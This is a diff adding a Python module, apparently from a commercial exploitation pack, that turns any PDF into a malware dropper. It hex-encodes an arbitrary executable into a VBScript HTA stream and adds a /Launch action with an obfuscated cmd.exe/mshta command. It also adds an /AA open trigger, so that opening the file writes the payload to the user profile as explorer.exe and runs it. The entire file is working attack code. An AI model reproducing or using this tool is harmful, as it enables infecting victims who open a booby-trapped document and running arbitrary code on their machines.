@@ -1,0 +1,231 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+import re
+import sys
+import os
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+NAME = "Generic Malicous PDF file with arbitrary embedded binary"
+DESCRIPTION = "Generic Malicous PDF file with arbitrary embedded binary"
+DOCUMENTATION = {}
+
+VERSION = "1.0"
+
+DOCUMENTATION={}
+DOCUMENTATION["Notes"] = """
+With this tool you can embed an arbitrary binary in the PDF file of your choice. When the PDF file 
+will be opened a security warning will appear. After the user clicked "open" the binary will be
+automatically launched. If needed you can tune the DOS command (see self.command in exploit code)
+
+The tool was tested on Adobe Acrobat Reader 5.0, 6.0, 7.0 and 8.0
+"""
+
+PROPERTY={}
+PROPERTY['TYPE']= "Tools"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+
+class theexploit(tcpexploit):
+	def __init__(self):
+		tcpexploit.__init__(self)        
+		
+		self.name = NAME
+		self.srcpdf = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_pdfbin/source.pdf"
+		self.dstpdf = "res.pdf"
+		self.binname = "app.exe"		
+		self.command = "@CD .. & @FOR /F \"usebackq delims=>\" %i IN (`dir /B /S res*.pdf`) do @copy /Y \"%~si\" \"%CD%/test.hta\" >NUL & @mshta.exe \"%CD%/test.hta\""
+		
+
+		return
+        
+	# Create the hta file with the embedded binary
+	def file4hta(self, exename):
+		evilprog = "explorer.exe"
+		e = []
+		
+		for a in exename:
+			for b in a:
+				if b == "\r":
+					d = "0d"
+				elif b == "\n":
+					d = "0a"
+				elif b == "\0":
+					d = "00"
+				else:
+					c = hex(ord(b))
+					d = c.replace("0x", "")
+	
+				if len(d) == 1:
+					d = "0"+d
+	
+				e.append(d)
+		
+		i = 0
+		j = 0
+		l = len(e)
+	
+		hta = "<SCRIPT language=vbs>\n\n"
+		while 1:
+		  hta += " prog = prog & \""
+	
+		  while i != 24:
+		    hta += "%s," % e[j]
+		    if j == l-1:
+		      break
+		    i += 1
+		    j += 1
+	
+		  if j == l-1:
+		    hta = hta[:-1] + "\"\n\n"
+		    break
+		  hta += "\"\n"
+		  i = 0
+	
+		hta += " tmp = Split(prog, \",\")\n"	
+		hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
+		hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
+		hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
+		hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
+		hta += " Set f = fso.CreateTextFile(path, True)\n\n"
+		hta += " For i = 0 To UBound(tmp)\n"
+		hta += "   prog = Int(\"&H\" & tmp(i))\n"
+		hta += "   f.Write Chr(prog)\n"
+		hta += " Next\n\n"
+		hta += " f.Close\n"
+		hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
+		hta += " self.Close\n"
+		hta += "</SCRIPT>\n"
+	
+		return hta 
+		
+	def getArgs(self):
+		self.srcpdf = self.argsDict.get("srcpdf", self.srcpdf)
+		self.dstpdf = self.argsDict.get("dstpdf", self.dstpdf)
+		self.binname = self.argsDict.get("binname", self.binname)
+
+		if self.srcpdf == "":
+			self.srcpdf = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_pdfbin/source.pdf"
+			
+		return
+
+	def run(self):
+		self.getArgs()
+		
+		# Open original PDF file
+		f = open(self.srcpdf, "rb")
+		buff = f.read()
+		f.close()
+		
+		# Search for xref array
+		exp = "xref[ \r\n]*0[ \r\n]*([0-9]+).*"
+		m = re.search(exp, buff)	
+		num =  int(m.group(1).strip())
+		
+		# Search the first obj
+		m = re.search("([0-9]+)[ \t]+0[ \t]+obj", buff)
+		myindex = m.start()
+		
+		# Add new object
+		tmp = buff[:myindex]
+		firstobj = "%d 0 obj\n<</Type /Action /S /Launch /Win << /F (cmd.exe) /P (/C " % (num)
+		firstobj += self.command + ") >> >>\nendobj\n" 
+		
+		# Open binary file
+		f = open(self.binname, "rb")
+		data = f.read()
+		f.close()
+		
+		# Create hta
+		data = self.file4hta(data)
+		
+		firstobj += "%d 0 obj\n<<>>\nstream\n" % (num + 1)
+		
+		tmp += firstobj
+		tmp += data
+		tmp += "\nendstream\n\nendobj\n"
+		tmp += buff[myindex:]
+		
+		buff = tmp
+		
+		# Search page object
+		exp = "/Page[ /\r\n]"
+		m = re.search(exp, buff)	
+		page = (buff[m.start():m.end()]).strip()
+		
+		# Modify page object
+		tmp = buff[:m.end()-1]
+		tmp += "/AA <</O %d 0 R>>" % (num)
+		tmp += buff[m.end()-1:]
+		
+		buff = tmp
+		
+		# Construct new xref array
+		m = re.finditer("([0-9]+)[ \t]+0[ \t]+obj", buff)
+		
+		mydic = []
+		
+		for i in m:
+			mydic.append((int(i.group(1)), i))
+		
+		testtab = []
+		testtab.append("0000000000")
+		
+		for i in sorted(mydic):
+			testtab.append("%010d" % i[1].start())	
+				
+		newxref = "xref\x0A0 %d\x0A" % len(testtab)
+		
+		for i, x in enumerate(testtab):
+			if i == 0:
+				newxref += "%s 65535 n \x0A" % testtab[i]
+			else:
+				newxref += "%s 00000 n \x0A" % testtab[i]
+				
+		# Search for new xref array
+		exp = "xref[ \r\n]*0[ \r\n]*([0-9]+).*"
+		m = re.search(exp, buff)	
+		xrefindex = m.start()
+		
+		# Search for new trailer
+		j = buff.rfind("trailer")
+		
+		# Create new PDF file
+		tmp = buff[:xrefindex] + newxref + buff[j:]
+		
+		m = re.search("startxref[ \t\r\n]+([0-9]+)", tmp)
+		
+		myend = m.end() - len(str(xrefindex))
+		
+		tmp = tmp[:myend] + str(xrefindex) + tmp[m.end():]
+		
+		f = open(self.dstpdf, "wb")
+		f.write(tmp)
+		f.close()
+
+		self.log("New PDF file %s created" % self.dstpdf)
+		
+		return 0
+		
+
+	def usage(self):
+		print 'Usage: %s -O srcpdf:source_pdf_path -O dstpdf:dest_pdf_path -O binname:binary_path'%(sys.argv[0])
+		sys.exit(0)
+
+
+
+if __name__=='__main__':
+	app = theexploit()
+	ret = standard_callback_commandline(app)
+
